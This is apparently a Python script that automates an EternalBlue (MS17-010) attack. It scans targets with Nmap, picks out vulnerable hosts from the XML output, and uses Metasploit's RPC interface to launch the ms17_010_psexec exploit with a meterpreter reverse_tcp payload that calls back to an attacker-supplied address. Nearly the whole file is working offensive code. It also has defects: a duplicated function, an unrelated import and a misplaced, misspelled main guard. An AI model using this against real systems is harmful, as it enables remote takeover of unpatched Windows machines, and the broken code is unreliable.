#!.venv/bin/python3

import xml.dom.minidom, nmap, subprocess, traceback
import xml.etree.ElementTree as ET

from Projects.vcpkg.scripts.generateBaseline import PORTS_DIRECTORY
from pymetasploit3.msfrpc import MsfRpcClient
def get_service_scan_parameters():
    """Prompt for service scanning parameters."""
    target = input("Target IP or network range: ").strip()
    source = input("Spoofed IP: ").strip()
    ports = input("Port or port range: ").strip()
    return target, source, ports

def get_service_scan_parameters():
    """Prompt for service scanning parameters."""
    target = input("Target IP or network range: ").strip()
    source = input("Spoofed IP: ").strip()
    ports = input("Port or port range: ").strip()
    return target, source, ports


def get_vuln_scan_params():
    """Prompt for target IP, port, and Nmap script."""
    target_ip = input("Target IP: ").strip()
    target_port = input("Target port: ").strip()
    script = input("Nmap script: ").strip()
    return target_ip, target_port, script


def nmap_vuln_ms17_010(xml_string):
    """Check if MS17-010 is vulnerable."""
    try:
        root = ET.fromstring(xml_string)

        for host in root.findall('.//host'):
            for hostscript in host.findall('.//hostscript'):
                for script in hostscript.findall('.//script'):
                    for elem in script.findall('.//elem[@key="state"]'):
                        if elem.text == "VULNERABLE":
                            address = host.find('.//address[@addrtype="ipv4"]').attrib['addr']
                            print("Vulnerable host address:", address)
                            return address

        print("Host is not vulnerable")

    except Exception as e:
        print(e)

    return -1


def conf_nat():
    """Configure network address translation."""
    subprocess.run("./set_NAT.sh", shell=True, executable="/bin/bash")


def msf_vuln_ms17_010(vuln_ms17_010_addr):
    """Run MS17-010 exploit in Metasploit."""
    try:
        client = MsfRpcClient('P@$$w0rd', port=55552)
        scan = client.modules.use('auxiliary', "scanner/smb/smb_ms17_010")
        print(scan.description, end='\n\n')
        scan['RHOSTS'] = vuln_ms17_010_addr
        scan['VERBOSE'] = True
        cid = client.consoles.console().cid
        print('Console ID: ' + cid)
        print(client.consoles.console(cid).run_module_with_output(scan))
        client.consoles.console(cid).destroy

    except Exception as e:
        print('Exception: %s \n' % e)
        traceback.print_tb(e.__traceback__)
        client.consoles.console(cid).destroy


def show_results(nm):
    """Show Nmap scan results."""
    for host in nm.all_hosts():
        print('----------------------------------------------------')
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())
        for proto in nm[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
            lport = nm[host][proto].keys()
            for port in lport:
                print('port : {:<5} state : {:<5} service: {:<12} {:<22} version: {:<25}'.format(
                    port, nm[host][proto][port]['state'],
                    nm[host][proto][port]['name'],
                    nm[host][proto][port]['version'],
                    nm[host][proto][port]['product']))


def exp_ms17_010(vuln_ms17_010_addr, spoofed_addr):
    """Run MS17-010 exploit."""
    try:
        client = MsfRpcClient('P@$$w0rd', port=55552)
        cid = client.consoles.console().cid
        print('Console ID: ' + cid)
        exploit = client.modules.use('exploit', 'windows/smb/ms17_010_psexec')
        exploit['RHOSTS'] = vuln_ms17_010_addr

        # create a payload object as normal
        payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
        # add paylod specific options
        payload['LHOST'] = spoofed_addr
        payload['LPORT'] = 5555
        # Execute the exploit with the linked payload, success will return a jobid
        jobid = exploit.execute(payload=payload)
        print("Please check Msfconsole for active sessions")
        client.consoles.console(cid).destroy

    except Exception as e:
        print('Exception: %s \n' % e)
        traceback.print_tb(e.__traceback__)
        client.consoles.console(cid).destroy
        if __name__ == "__main":
            exp_ms17_010(vuln_ms17_010_addr, spoofed_addr)
